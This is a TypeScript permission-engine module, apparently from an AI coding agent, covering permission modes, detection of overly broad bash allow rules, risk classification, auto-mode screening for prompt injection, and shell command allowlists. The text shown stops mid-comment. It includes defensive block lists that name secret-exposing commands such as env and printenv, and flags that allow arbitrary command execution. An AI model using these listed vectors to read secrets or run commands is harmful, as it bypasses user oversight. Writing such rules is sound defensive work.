import { z } from 'zod';
import { isGitInvocationReadOnly } from './git-invocation';
export { isGitInvocationReadOnly } from './git-invocation';
import { globToRegexSource } from './glob-to-regex';
export { globToRegexSource } from './glob-to-regex';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { expandPath, realpathNFC } from './utils/path';
import { memoizeWithLRU } from './utils/memoize';
import { DEFAULT_MAX_PATTERN_LENGTH } from './safe-regex';
import { atomicWriteFileSync, OWNER_ONLY_FILE_MODE } from './utils/fs-atomic';
import { addFileGlobRuleToGitignore } from './utils/git';
import { extractCommandPaths, commandTargetsCredentialPath, commandTargetsSystemDir, isCredentialPath, detectUnsafeHelpCommand, detectArchiveExtractionWithGit, detectSymlinkCreateCompound, detectCdSensitiveDesync, isReadOnlySedCommand, stripHeredocBodies, WRAPPER_VALUE_FLAGS, SRUN_VALUE_FLAGS } from './tools/bash-security';
import { isPowerShellNeverSuggest, isReadOnlyPowerShellCommand, isAcceptEditsPowerShellWrite, canonicalizePowerShellCommandName } from './tools/powershell-security';
import { deobfuscateEnvExpansion } from './tools/command-normalize';
import { valueFlagsForCommand } from './tools/command-spec-registry';
import { getCommandSpec as getArgCommandSpec, buildSpecPrefix, isScopedModulePrefix } from './tools/bash-command-specs';
import { unwrapWrapperChain, collapseCompoundPrefixes } from './tools/command-prefix';
import { detectPromptInjection } from './tools/input-sanitizer';
import { isDangerousCodeExecPrefix } from './dangerous-code-exec';
import './config';
import { classifyAutoModeUnavailableReason, type AutoModeUnavailableReason } from './auto-mode';
import { evaluateToolCeiling, type ToolCapabilityCeiling } from './tools/scoped-permissions';
import { isReadOnlyBashCommand } from './tools/bash-cache';
import { isScratchpadPath } from './scratchpad';
import { analyzeCommandStructure } from './tools/bash-parser';
import { TESTING_PERMISSION_TOOL_NAME } from './tools/testing-permission';
import { isCaseInsensitiveFs } from './tools/tool-utils';
import { log as logDebug } from './logger';
import {
  SpeculativeClassifierCache,
  DEFAULT_SPECULATIVE_GRACE_MS,
  PendingPromptLatch,
  type SpeculativeBashClassifier,
} from './speculative-classifier';
import type { SandboxPolicy } from './types';

import { EXTERNAL_PERMISSION_MODES, PERMISSION_MODES, PERMISSION_MODE_ALIASES, coercePermissionRuleSource, isDefaultMode, isManagedPermissionSource, isPermissivePermissionMode, isSharedSettingSource, managedPermissionsPath, permissionDestinationPath, permissionRuleSourceDisplayString } from './permissions-permission-mode-aliases';
import type { AutoModeSafetyVerdict, BashClassification, DetectUnreachableRulesOptions, ExternalPermissionMode, PermissionMode, PermissionModeChange, PermissionModeChangeListener, PermissionRule, PermissionRuleSource, PermissionUpdateDestination, ShadowType, UnreachableRule } from './permissions-permission-mode-aliases';
import { BASH_CLASSIFICATION_RISK, collectToolInputText, createPermissionRequestMessage, extractBashCommandText } from './permissions-permission-prompt-result';
import type { AutoModeSafetyClassifier, AutoModeScreen, DenyCheckResult, PermissionDecisionReason, PermissionExplanation, PermissionPromptToolType, RecentDenial } from './permissions-permission-prompt-result';
import { BASE64_ARG_TYPES, CHECKSUM_ARG_TYPES, FD_ARG_TYPES, FLAG_PATTERN, GREP_ARG_TYPES, PYRIGHT_ARG_TYPES, SENSITIVE_SAFETY_PATHS, detectPathExpansionHazard, isUnvalidatableReadGlob, normalizeCaseForComparison, pathExpansionHazardReason, stripPathObscuring } from './permissions-permission-verdict';
import type { SafeCommandFlagDef } from './permissions-permission-verdict';
import { DESTRUCTIVE_SQL_PATTERNS, HARDLINE_PATTERNS, containsShellSubstitution, dockerReadOnlyFlagsSafe, hasUnbalancedQuotes, isJqDangerous, isScriptOneLinerSafe, validateTypedCommandFlags } from './permissions-contains-shell-substitution';
import type { DefaultPermissionPatterns } from './permissions-contains-shell-substitution';
import { AGENT_CONFIG_DIR_SEGMENTS, BUILD_CONFIG_PATH_PATTERNS, GIT_CLEAN_FORCE_RE, MAX_COMMAND_PARSE_DEPTH, SYSTEM_DIRECTORIES, WINDOWS_DRIVE_ROOT_REGEX, _REALPATH_MISS, detectHardlineCommand, findMatchingParen, getAutoAllowedPowerShellCmdlets, getPathsForPermissionCheck, ghArgsTargetForeignHost, hasSuspiciousPathPattern, isDangerousRemovalPath, isGitReadOnlyCommandSafe, isNormalizedGitCommand, unwrapShellControlStructures } from './permissions-get-paths-for-permission-check';
import type { DestructivePattern } from './permissions-get-paths-for-permission-check';
import { ENV_VAR_ASSIGN_RE, MAX_SUBCOMMANDS_FOR_SECURITY_CHECK, SUBCOMMAND_SHAPE_RE, commandHasCdWriteDesync, countDirectoryChanges, extractCommandSubstitutions, isDisguisedBareGitRepo, normalizeCommandForMatching, patternWithRoot, skipGlobalFlags, splitCompoundCommand, stripOutputRedirections } from './permissions-strip-output-redirections';
import type { BashCommandSpec } from './permissions-strip-output-redirections';
import { AGENT_TOOL_NAME, LEGACY_AGENT_TOOL_NAME, MAX_SUGGESTED_RULES_FOR_COMPOUND, TOOL_PATTERN_CLASS, countUnescapedChar, findFirstUnescapedChar, findLastUnescapedChar, isEscapedAt, isHelpCommand, matchConfigFolderRoot, mcpInfoFromString, permissionRuleValueToString, unescapeRuleContent, validatePermissionUpdate } from './permissions-validate-permission-update';
import type { DangerousPermissionInfo, FileOperationType, PermissionRuleValue, PermissionUpdate, ToolPatternClass } from './permissions-validate-permission-update';
import { TOOL_CONTENT_VALIDATORS, createPermissionRetryMessage, createReadRuleSuggestion, describeRule, dynamicAllowPatternToken, formatPermissionRuleError, getSkillScopeRule, managedRuleReadOnlyNotice, permissionRuleExtractPrefix } from './permissions-get-skill-scope-rule';
import type { ToolContentValidator } from './permissions-get-skill-scope-rule';
import { PolicyMemo, commandHasRulePrefix, denialKey, stripSingleQuotedSpans } from './permissions-policy-memo';
export { BASH_CLASSIFICATIONS, EXTERNAL_PERMISSION_MODES, OUT_OF_WORKSPACE_PATH_DISPOSITIONS, PERMISSION_MODES, PERMISSION_MODE_ALIASES, PERMISSION_MODE_CYCLE, PERMISSION_RULE_SOURCES, PERMISSION_UPDATE_DESTINATIONS, SHADOW_TYPES, coercePermissionRuleSource, cyclePermissionMode, isDefaultMode, isManagedPermissionSource, isPermissivePermissionMode, isSharedSettingSource, managedPermissionsPath, outOfWorkspacePathDisposition, permissionDestinationPath, permissionRuleSourceDisplayString } from './permissions-permission-mode-aliases';
export type { AutoModeSafetyContext, AutoModeSafetyVerdict, BashClassification, DetectUnreachableRulesOptions, ExternalPermissionMode, OutOfWorkspacePathDisposition, PermissionMode, PermissionModeChange, PermissionModeChangeListener, PermissionRule, PermissionRuleSource, PermissionUpdateDestination, ShadowType, UnreachableRule } from './permissions-permission-mode-aliases';
export { PERMISSION_GRANT_TIERS, PERMISSION_PROMPT_TOOL_TYPES, RISK_LEVELS, SAFETY_CHECK_KINDS, SESSION_GRANT_SCOPES, createPermissionRequestMessage, getRuleBehaviorDescription, isSessionOnlyGrant, permissionGrantTier, riskLevelRank } from './permissions-permission-prompt-result';
export type { AutoModeSafetyClassifier, AutoModeScreen, DenyCheckResult, PermissionDecisionReason, PermissionExplanation, PermissionGrantTier, PermissionPromptHandler, PermissionPromptResult, PermissionPromptToolType, RecentDenial, RiskLevel, SafetyCheckKind, SessionGrantScope } from './permissions-permission-prompt-result';
export { GLOB_PATTERN_REGEX, PATH_EXPANSION_HAZARDS, containsGlobPattern, containsPathTraversal, detectPathExpansionHazard, holdsOver, isUnvalidatableReadGlob, mostRestrictiveVerdict, normalizeCaseForComparison, pathExpansionHazardReason, stripPathObscuring, validateFlagArgument, verdictRank } from './permissions-permission-verdict';
export type { FlagArgType, PathExpansionHazard, PermissionVerdict } from './permissions-permission-verdict';
export { containsShellSubstitution, containsUnquotedExpansion, hasUnbalancedQuotes } from './permissions-contains-shell-substitution';
export type { DefaultPermissionPatterns } from './permissions-contains-shell-substitution';
export { MAX_COMMAND_PARSE_DEPTH, detectCommandChaining, detectHardlineCommand, getAutoAllowedPowerShellCmdlets, getPathsForPermissionCheck, ghArgsTargetForeignHost, hasSuspiciousPathPattern, isDangerousRemovalPath, isGitReadOnlyCommandSafe, isNormalizedCdCommand, isNormalizedGitCommand, unwrapShellControlStructures } from './permissions-get-paths-for-permission-check';
export { MAX_SUBCOMMANDS_FOR_SECURITY_CHECK, commandHasCdWriteDesync, countDirectoryChanges, isDisguisedBareGitRepo, normalizeLineContinuations, patternWithRoot, stripLeadingNoopCd, stripOutputRedirections } from './permissions-strip-output-redirections';
export type { BashCommandSpec } from './permissions-strip-output-redirections';
export { AGENT_TOOL_NAME, CONFIG_FOLDER_SCOPES, FILE_OPERATION_TYPES, LEGACY_AGENT_TOOL_NAME, MAX_SUGGESTED_RULES_FOR_COMPOUND, PERMISSION_BEHAVIORS, TOOL_PATTERN_CLASS, TOOL_PATTERN_CLASSES, escapeRuleContent, isHelpCommand, mcpInfoFromString, permissionRuleValueToString, resolveConfigFolderScope, unescapeRuleContent, validatePermissionUpdate } from './permissions-validate-permission-update';
export type { ConfigFolderScope, DangerousPermissionInfo, FileOperationType, PermissionBehavior, PermissionRuleValue, PermissionUpdate, ToolPatternClass } from './permissions-validate-permission-update';
export { MAX_ALLOWED_PROMPT_LENGTH, PROMPT_RULE_PREFIX, TOOL_CONTENT_VALIDATORS, createPermissionRetryMessage, createPromptRuleContent, createReadRuleSuggestion, describeRule, dynamicAllowPatternToken, extractPromptDescription, formatPermissionRuleError, getSkillScopeRule, isPromptRuleContent, managedRuleReadOnlyNotice, partitionAllowedPromptRules, permissionRuleExtractPrefix, validateAllowedPromptRule } from './permissions-get-skill-scope-rule';
export type { PermissionRuleValidationResult, ToolContentValidator } from './permissions-get-skill-scope-rule';
export { PolicyMemo } from './permissions-policy-memo';

/**
 * Zod enum over the canonical {@link PERMISSION_MODES}. The single VALIDATION
 * primitive for a permission-mode string, reusable anywhere a settings/config
 * schema needs to parse one (mirrors the reference's `permissionModeSchema`). It
 * is discovery-driven — it derives from the `PERMISSION_MODES` tuple, so a new
 * canonical mode is accepted the moment it is added there (no second list to
 * keep in sync). {@link normalizePermissionMode} parses the canonical arm through
 * this schema, so the schema and the normalizer can never disagree on what counts
 * as a canonical mode. Prefer this over an inline `.includes` check at new call
 * sites so a settings validator gets a typed {@link PermissionMode} back.
 */
export const permissionModeSchema = z.enum(PERMISSION_MODES);

/**
 * The single acceptance boundary for a permission-mode string (discovery-driven: the
 * valid set IS {@link PERMISSION_MODES}, so a new mode is accepted everywhere the moment
 * it is added to the const — no hardcoded subset can drift, cf. ui#19). Returns the
 * canonical mode, resolves a non-canonical spelling via {@link PERMISSION_MODE_ALIASES}
 * (exact match first, then case-insensitively — e.g. `default` → `ask`, the reference
 * wire name), or null if unknown. Every consumer (CLI `--permission-mode`, project
 * config, `/permissions <mode>`) MUST validate through this rather than an inline list.
 */
export function normalizePermissionMode(raw: string): PermissionMode | null {
  const m = raw.trim();
  // Canonical modes win first — an alias can never shadow or re-map a real mode.
  // Parsed through the shared {@link permissionModeSchema} so the normalizer and
  // the settings-validation schema agree byte-for-byte on the canonical set.
  const canonical = permissionModeSchema.safeParse(m);
  if (canonical.success) return canonical.data;
  // Exact alias (preserves camel spellings like `dontAsk`), then case-insensitive.
  return PERMISSION_MODE_ALIASES[m] ?? PERMISSION_MODE_ALIASES[m.toLowerCase()] ?? null;
}

/** Zod enum over {@link EXTERNAL_PERMISSION_MODES} — the validation primitive for
 *  the reduced external/SDK mode vocabulary (parity: the reference's
 *  `externalPermissionModeSchema`). Backs {@link isExternalPermissionMode} so the
 *  guard and any external-config schema share one source of truth. */
export const externalPermissionModeSchema = z.enum(EXTERNAL_PERMISSION_MODES);

/**
 * Type guard: is `mode` already a value in the external vocabulary? `acceptEdits`,
 * `bypassPermissions`, and `plan` are shared between the internal and external sets,
 * so they pass through {@link toExternalPermissionMode} unchanged. AMI-internal-only
 * modes (`ask`, `auto-allow`, `deny-all`) are not external and must be mapped.
 */
export function isExternalPermissionMode(mode: string): mode is ExternalPermissionMode {
  return externalPermissionModeSchema.safeParse(mode).success;
}

/**
 * Collapse an INTERNAL {@link PermissionMode} onto the {@link ExternalPermissionMode}
 * surfaced to external/SDK consumers (parity: the reference's `toExternalPermissionMode`).
 * `ask`/`undefined` → `default` (the neutral mode); the three shared modes pass
 * through unchanged; the remaining internal-only modes map to their closest external
 * equivalent — a blanket `auto-allow` reads as `bypassPermissions` (both skip the
 * prompt), and a blanket `deny-all` has no external counterpart so it reads as the
 * conservative `default`.
 */
export function toExternalPermissionMode(mode: PermissionMode | undefined): ExternalPermissionMode {
  // isDefaultMode covers both undefined and the neutral `ask` mode.
  if (mode === undefined || isDefaultMode(mode)) return 'default';
  if (isExternalPermissionMode(mode)) return mode;
  // Remaining internal-only modes after the default + shared-mode checks.
  return mode === 'auto-allow' ? 'bypassPermissions' : 'default';
}

/**
 * The SINGLE canonical "is this an overly-broad bash allow?" predicate (shared by
 * core {@link PermissionManager}'s load-time strip and cli config-resolver's
 * warning/opt-in strip — no second definition, cf. No-Duplication Rule). True when
 * a bash (or all-tools `*`) `allow` rule has NO content restriction and therefore
 * auto-approves EVERY bash command — the YOLO / bypass-permissions equivalent:
 * `rule.pattern ? … : true` in {@link PermissionManager.check} matches a
 * pattern-less rule against every command, as does an empty or `*` pattern, and a
 * `*`-tool allow spans bash too. A param-scoped rule is NOT broad (it still
 * constrains the input), nor is any deny / non-bash-and-non-`*` rule. Mirrors
 * the reference's `isOverlyBroadBashAllowRule` (utils/permissions/permissionSetup.ts
 * L349-355 — `Bash`, `Bash(*)`, `Bash()` all parse to a Bash allow with no
 * ruleContent). Interpreter-prefix forms (`python:*`, `node*`) are a SEPARATE,
 * broader hazard class handled by the cli detector on top of this predicate.
 */
export function isOverlyBroadBashAllowRule(rule: PermissionRule): boolean {
  if (rule.action !== 'allow') return false;
  if (rule.paramPattern && Object.keys(rule.paramPattern).length > 0) return false;
  const targetsBash = normalizeToolName(rule.tool) === 'bash' || rule.tool === '*';
  if (!targetsBash) return false;
  const p = rule.pattern;
  return p === undefined || p === '' || p.trim() === '*';
}

/** True when a PARSED rule value (a `Tool(content)` spec, as from a `--allow`
 *  flag) is an overly-broad bash allow — the value-level twin of
 *  {@link isOverlyBroadBashAllowRule}, which takes a loaded {@link PermissionRule}.
 *  A pattern-less / empty / `*` bash (or all-tools `*`) spec auto-approves every
 *  bash command. */
function isOverlyBroadBashAllowRuleValue(value: PermissionRuleValue): boolean {
  const targetsBash = normalizeToolName(value.toolName) === 'bash' || value.toolName === '*';
  if (!targetsBash) return false;
  const c = value.ruleContent;
  return c === undefined || c === '' || c.trim() === '*';
}

/**
 * Scan loaded `allow` rules AND raw CLI `--allow` tool specs for overly-broad bash
 * grants (the YOLO / bypass-permissions equivalent) and return a structured
 * {@link DangerousPermissionInfo} per hit, so a UI / `/permissions` surface can
 * warn the user that a rule silently grants full shell autonomy. Mirrors the reference's
 * `findOverlyBroadBashPermissions` (utils/permissions/permissionSetup.ts
 * L376-412): it checks both persisted rules and the ephemeral `--allow` flag list,
 * tagging the latter with the `cliArg` source and `--allow` display. Uses the
 * single canonical breadth detector ({@link isOverlyBroadBashAllowRule} /
 * {@link isOverlyBroadBashAllowRuleValue}) — no second classifier.
 */
export function findOverlyBroadBashPermissions(
  rules: readonly PermissionRule[],
  cliAllowedTools: readonly string[] = [],
): DangerousPermissionInfo[] {
  const found: DangerousPermissionInfo[] = [];
  for (const rule of rules) {
    if (isOverlyBroadBashAllowRule(rule)) {
      found.push({
        ruleValue: { toolName: rule.tool, ruleContent: rule.pattern },
        source: rule.source ?? 'session',
        ruleDisplay: 'bash(*)',
        sourceDisplay: permissionRuleSourceDisplayString(rule.source),
      });
    }
  }
  for (const spec of cliAllowedTools) {
    const parsed = permissionRuleValueFromString(spec);
    if (isOverlyBroadBashAllowRuleValue(parsed)) {
      found.push({
        ruleValue: parsed,
        source: 'cliArg',
        ruleDisplay: 'bash(*)',
        sourceDisplay: '--allow',
      });
    }
  }
  return found;
}

/**
 * Classify a tool by name into its {@link PermissionPromptToolType} for prompt
 * wording. Reuses the permission engine's own read/mutating tool-name sets (no
 * parallel list, cf. No-Duplication Rule): bash → `'command'`, an editing/writing
 * tool → `'edit'`, a read-only tool → `'read'`, anything else → a generic
 * `'tool'`. Mirrors the reference's per-category phrasing in PermissionRuleExplanation.
 */
export function permissionPromptToolType(toolName: string): PermissionPromptToolType {
  const tool = normalizeToolName(toolName);
  if (tool === 'bash') return 'command';
  if (MUTATING_RISK_TOOLS.has(tool)) return 'edit';
  if (READ_ONLY_RISK_TOOLS.has(tool)) return 'read';
  return 'tool';
}

/** Tool names (canonical) that only READ state and are therefore always low risk. */
const READ_ONLY_RISK_TOOLS = new Set([
  'file_read', 'read', 'grep', 'glob', 'ls', 'list', 'web_search', 'notebook_read',
]);
/** Tool names (canonical) that mutate the local workspace in a recoverable way. */
const MUTATING_RISK_TOOLS = new Set([
  'file_edit', 'file_write', 'notebook_edit', 'write', 'edit',
]);

/** Lazily-created manager reused only for its static bash classifier, so
 *  {@link classifyPermissionRisk} reuses the canonical classification (no duplicate
 *  destructive/safe tables) without allocating per call. */
let _riskClassifierManager: PermissionManager | undefined;
function classifyBashForRisk(command: string): BashClassification {
  _riskClassifierManager ??= new PermissionManager();
  return _riskClassifierManager.classifyBashCommand(command);
}

/**
 * Deterministically assess the risk of a pending tool call and produce a
 * {@link PermissionExplanation}. Pure and side-effect free: it reuses the
 * permission engine's own classifiers (bash → {@link PermissionManager.classifyBashCommand},
 * which folds in hardline/destructive/credential detection) and a small tool-name
 * risk map for non-bash tools. Unknown tools default to MEDIUM (recoverable) —
 * never silently LOW. This is the data the CLI's permission-prompt explainer and
 * the denial log render; AMI computes it locally instead of via an LLM side-query.
 */
export function classifyPermissionRisk(toolName: string, input: unknown): PermissionExplanation {
  const tool = normalizeToolName(toolName);

  if (tool === 'bash') {
    const command = extractBashCommandText(input).trim();
    if (!command) {
      return {
        riskLevel: 'LOW',
        explanation: 'Runs an empty shell command.',
        reasoning: 'I am about to run a shell command.',
        risk: 'No effect.',
      };
    }
    const riskLevel = BASH_CLASSIFICATION_RISK[classifyBashForRisk(command)];
    const explanation = `Runs the shell command \`${command}\`.`;
    switch (riskLevel) {
      case 'HIGH':
        return {
          riskLevel,
          explanation,
          reasoning: 'I need to run this command to make the requested change.',
          risk: 'This command is destructive or irreversible and may cause data loss.',
        };
      case 'MEDIUM':
        return {
          riskLevel,
          explanation,
          reasoning: 'I need to run this command to make progress on the task.',
          risk: 'This command changes local state; effects are usually recoverable.',
        };
      default:
        return {
          riskLevel,
          explanation,
          reasoning: 'I need to inspect the project to continue.',
          risk: 'Read-only; no state is modified.',
        };
    }
  }

  if (READ_ONLY_RISK_TOOLS.has(tool)) {
    return {
      riskLevel: 'LOW',
      explanation: `Uses the ${tool} tool, which only reads or searches.`,
      reasoning: 'I need to inspect the project to continue.',
      risk: 'Read-only; no state is modified.',
    };
  }

  if (MUTATING_RISK_TOOLS.has(tool)) {
    return {
      riskLevel: 'MEDIUM',
      explanation: `Uses the ${tool} tool to modify a file in the workspace.`,
      reasoning: 'I need to apply this change to complete the task.',
      risk: 'Overwrites file content; effects are usually recoverable from version control.',
    };
  }

  if (tool === 'web_fetch') {
    return {
      riskLevel: 'MEDIUM',
      explanation: 'Fetches content from a remote URL.',
      reasoning: 'I need information from this URL to continue.',
      risk: 'Sends a network request to an external host.',
    };
  }

  return {
    riskLevel: 'MEDIUM',
    explanation: `Uses the ${tool} tool.`,
    reasoning: 'I need to use this tool to continue the task.',
    risk: 'Effects depend on the tool; review before approving.',
  };
}

/**
 * Swarm/agent-coordination tools that the `auto` permission-mode screen treats as
 * safe-to-run WITHOUT re-screening. These tools do not themselves touch the
 * filesystem/network in a way the per-call risk model should re-judge: they spawn
 * subagents ({@link task}), create/delete teammate inboxes (`team_create` /
 * `team_delete`), route a message to another agent (`send_message`), or launch a
 * workflow — and every action those delegates take is INDEPENDENTLY permission-checked
 * when the delegate runs. Re-screening the coordinator here is both redundant and
 * actively harmful: a `send_message`/`task` payload legitimately carries free-form
 * task text that can trip the prompt-injection heuristic ({@link detectPromptInjection}),
 * which would stall autonomous swarm coordination that is in fact safe. Mirrors
 * the reference's `SAFE_YOLO_ALLOWLISTED_TOOLS` (classifierDecision.ts) and its
 * documented rationale that spawned subagents/teammates carry their own per-call
 * permission checks. Names are AMI-canonical (post {@link normalizeToolName}), so a
 * legacy/aliased spelling (`Task` → `task`) is covered too.
 */
export const AUTO_MODE_SAFE_TOOLS: ReadonlySet<string> = new Set([
  'send_message',
  'task',
  'team_create',
  'team_delete',
  'workflow',
]);

/**
 * True when `toolName` is a coordination/orchestration tool the `auto` mode screen
 * may allow without re-judging ({@link AUTO_MODE_SAFE_TOOLS}). The name is
 * canonicalized first so a legacy/cross-framework spelling (e.g. the reference's `Task`)
 * is recognized as AMI's `task`.
 */
export function isAutoModeSafeTool(toolName: string): boolean {
  return AUTO_MODE_SAFE_TOOLS.has(normalizeToolName(toolName));
}

/**
 * Screen a single pending tool call for the `auto` permission mode: run it when
 * judged safe, block it when judged risky. A call is blocked when its input
 * carries a prompt-injection pattern ({@link detectPromptInjection}) OR when its
 * deterministic risk is HIGH (destructive/irreversible — {@link classifyPermissionRisk}).
 * LOW (read-only) and MEDIUM (recoverable mutation) calls run without a prompt.
 * Pure and side-effect free; reuses the existing classifiers so the screen can
 * never drift from the permission engine's own risk model (No-Duplication Rule).
 * Parity: the reference's auto mode (per-call risk + prompt-injection gate with a
 * block-and-retry fallback, AutoModeOptInDialog.tsx).
 */
export function screenAutoModeToolCall(toolName: string, input: unknown): AutoModeScreen {
  // Coordination/orchestration tools skip the screen: they only delegate work to
  // subagents/teammates/workflows, each of which is INDEPENDENTLY permission-checked
  // when it runs, so re-judging the coordinator is redundant — and the free-form task
  // text these calls carry would otherwise trip the injection/risk heuristics and
  // stall safe autonomous coordination. Parity: the reference's SAFE_YOLO_ALLOWLISTED_TOOLS.
  if (isAutoModeSafeTool(toolName)) {
    return {
      decision: 'allow',
      riskLevel: 'LOW',
      injection: false,
      reason: 'allowed: coordination tool (delegates to self-checking subagents)',
    };
  }
  const injection = detectPromptInjection(collectToolInputText(input));
  if (injection.suspicious) {
    return {
      decision: 'deny',
      riskLevel: 'HIGH',
      injection: true,
      reason: `blocked: tool input matches a prompt-injection pattern (${injection.pattern})`,
    };
  }
  const risk = classifyPermissionRisk(toolName, input);
  if (risk.riskLevel === 'HIGH') {
    return {
      decision: 'deny',
      riskLevel: 'HIGH',
      injection: false,
      reason: `blocked: ${risk.risk}`,
    };
  }
  return {
    decision: 'allow',
    riskLevel: risk.riskLevel,
    injection: false,
    reason: risk.risk,
  };
}

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

/**
 * Commands that are inherently read-only or side-effect-free.
 * These are auto-allowed in 'ask' mode.
 *
 * NOTE: `env` and `printenv` are intentionally excluded — they expose
 * sensitive environment variables (API keys, tokens, etc.).
 */
const SAFE_COMMANDS = new Set([
  'ls', 'cat', 'head', 'tail', 'wc', 'grep', 'rg', 'echo', 'pwd',
  'which', 'whoami', 'date', 'uname', 'hostname',
  'cd', // directory change — no side effects on the filesystem
  'id', 'df', 'du', 'file', 'stat', 'readlink', 'basename', 'dirname',
  'sort', 'uniq', 'diff', 'tr', 'cut', 'less', 'more',
  'test', 'true', 'false', 'type', 'man', 'help',
  // JSON/YAML processors (flag-validated)
  'jq', 'yq',
  // Command builder (flag-validated, target-restricted)
  'xargs',
  // Network/process inspection (flag-validated)
  'netstat', 'lsof', 'pgrep', 'ss', 'ps',
  // Terminal capabilities (flag-validated)
  'tput',
  // File finders (flag-validated)
  'fd', 'fdfind',
  // Directory tree (flag-validated)
  'tree',
  // Computational / text read-only utilities (side-effect-free)
  'seq', 'expr', 'printf', 'comm', 'cmp', 'numfmt', 'getconf', 'tsort', 'pr', 'fmt',
  // Encoding / checksum read-only utilities (flag-validated). base64 only decodes/
  // encodes to stdout; the *sum commands only read files to compute/verify a hash.
  // Mirrors the reference's base64 / sha256sum / sha1sum / md5sum read-only configs.
  'base64', 'sha256sum', 'sha1sum', 'md5sum',
  // Read-only type checker (flag-validated, --watch blocked). Mirrors the reference's
  // PYRIGHT_READ_ONLY_COMMANDS. `dotnet` is handled specially below (only its
  // read-only top-level flags like --version/--info are auto-allowed).
  'pyright', 'dotnet',
]);

/**
 * `dotnet` top-level flags that are purely read-only SDK queries. Any other
 * invocation (build/run/test/…) must prompt. Mirrors the reference's
 * DOTNET_READ_ONLY_FLAGS / isDotnetSafe.
 */
const DOTNET_READ_ONLY_FLAGS = new Set([
  '--version', '--info', '--list-runtimes', '--list-sdks',
]);

/**
 * Whether a `dotnet` invocation is a read-only SDK query: it has at least one
 * argument AND every argument is a recognised read-only top-level flag. A bare
 * `dotnet` (prints help but is treated as non-read by the reference) and any subcommand
 * (build/run/…) return false. Mirrors the reference's isDotnetSafe.
 */
function isDotnetSafe(args: string[]): boolean {
  if (args.length === 0) return false;
  return args.every(a => DOTNET_READ_ONLY_FLAGS.has(a.toLowerCase()));
}

const SAFE_COMMAND_FLAGS: Record<string, SafeCommandFlagDef> = {
  // ── All-flags-safe read-only utilities (U003 allowAllFlags opt-in) ────────────
  // Each command's entire flag surface only reads/formats/inspects — no flag writes
  // or executes. An explicit entry is REQUIRED under the fail-closed default below;
  // allowAllFlags makes that entry accept any flag so inverting the default never
  // regresses these. Commands with a WRITE-capable flag surface (hostname below) get
  // a restrictive allowlist instead.
  ls: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  cat: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  head: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  tail: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  wc: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  echo: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  pwd: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  whoami: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  uname: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  cd: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  id: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  df: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  du: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  stat: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  readlink: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  basename: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  dirname: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  uniq: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  diff: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  tr: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  cut: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  less: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  more: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  test: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  true: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  false: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  type: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  seq: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  expr: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  printf: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  comm: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  cmp: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  numfmt: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  getconf: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  tsort: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  pr: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  fmt: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  // `dotnet`: accept its flag SHAPE here (so a read-only query is not rejected by the
  // fail-closed default); the real restriction to read-only SDK queries is enforced
  // by the isDotnetSafe positional/flag check in classifyBashCommand.
  dotnet: { allowed: new Set([]), blocked: new Set([]), allowAllFlags: true },
  // `hostname`: identification flags (-f/-i/-s/-d/…) are read-only, but `-b`/`--boot`
  // SET the hostname from boot config and `-F`/`--file` SET it from a file — writes
  // that must prompt. Strict allowlist (U003): any flag outside the read set (notably
  // the set flags) falls through to a prompt instead of the old fail-OPEN auto-allow.
  hostname: {
    allowed: new Set([
      '-a', '--alias', '-A', '--all-fqdns', '-d', '--domain',
      '-f', '--fqdn', '--long', '-i', '--ip-address', '-I', '--all-ip-addresses',
      '-s', '--short', '-y', '--yp', '--nis', '-h', '--help', '-V', '--version',
    ]),
    blocked: new Set(['-b', '--boot', '-F', '--file']),
    strict: true,
  },
  jq: {
    allowed: new Set(['-r', '-e', '-c', '-S', '-s', '--raw-output', '--exit-status', '--compact-output', '--sort-keys', '--arg', '--argjson', '--null-input', '-n']),
    blocked: new Set(['-f', '--from-file', '--rawfile', '--slurpfile', '-L', '--library-path']),
  },
  yq: {
    allowed: new Set(['-r', '-e', '-c', '-S', '-s', '--raw-output', '--exit-status', '--compact-output', '--sort-keys', '--arg', '--argjson', '--null-input', '-n']),
    blocked: new Set(['-f', '--from-file', '--rawfile', '--slurpfile', '-L', '--library-path']),
  },
  // `man`: a pager/renderer launcher. `-P <cmd>`/`--pager=<cmd>` runs an arbitrary
  // program as the pager and `-H[browser]`/`--html[=browser]` launches a browser —
  // both are arbitrary-command-execution vectors, so they can never be auto-safe.
